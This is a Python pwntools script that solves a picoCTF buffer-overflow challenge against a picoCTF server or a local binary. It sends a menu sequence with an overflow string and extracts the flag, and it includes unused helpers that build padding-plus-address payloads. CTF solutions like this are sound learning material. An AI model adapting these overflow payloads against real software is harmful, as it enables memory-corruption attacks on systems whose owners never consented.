from pwn import *
import sys

def reverse_str(str):
    chunks = [str[i:i+2] for i in range(0, len(str), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]
    return ''.join(hex_bytes)


def construct_payload(dist, win_addr, encode=False):
    payload = "A" * dist
    payload+=reverse_str(win_addr)
    if encode:
        return payload.encode().decode('unicode_escape').encode('latin1')
    return payload

def send_to_server(conn: remote):
    conn.sendline(b'5')
    conn.sendline(b'2')
    conn.sendline(b'35')
    conn.sendline(b'AAAAAAAAAABBBBBBBBBBCCCCCCCCCCpico')
    conn.sendline(b'4')
    response=conn.recvall()
    conn.close()
    return response.decode('utf-8', errors='ignore')

def get_flag(output):
    index = output.find("picoCTF{")
    result = output[index:]  # substring from pattern to end
    return result


def remote_server():
    host = 'mimas.picoctf.net'
    port = 59348
    conn = remote(host, port)
    server_output = send_to_server(conn)
    print(get_flag(server_output))


def local():
    p=process("./chall")
    local_output = send_to_server(p)
    print(get_flag(local_output))

def main():
    if(len(sys.argv) <=1):
        print("Please enter operation")
        sys.exit()
    operation=sys.argv[1]
    
    if operation == "local":
        local()
    elif operation == "remote":
        remote_server()
    else:
        print("Invalid operation")
main()